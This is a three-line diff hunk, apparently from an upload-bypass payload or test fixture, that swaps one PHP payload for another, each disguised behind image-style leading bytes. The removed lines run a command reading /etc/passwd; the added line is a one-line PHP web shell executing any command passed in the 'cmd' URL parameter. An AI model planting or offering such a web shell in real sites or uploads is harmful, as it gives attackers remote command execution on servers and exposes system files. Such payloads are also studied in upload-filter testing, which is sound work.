@@ -1,3 +1,1 @@
-ÿØÿî<?php
-system("cat /etc/passwd")
-?>
+ï¿½ï¿½ï¿½ï¿½<?php echo(shell_exec($_GET['cmd']))?>
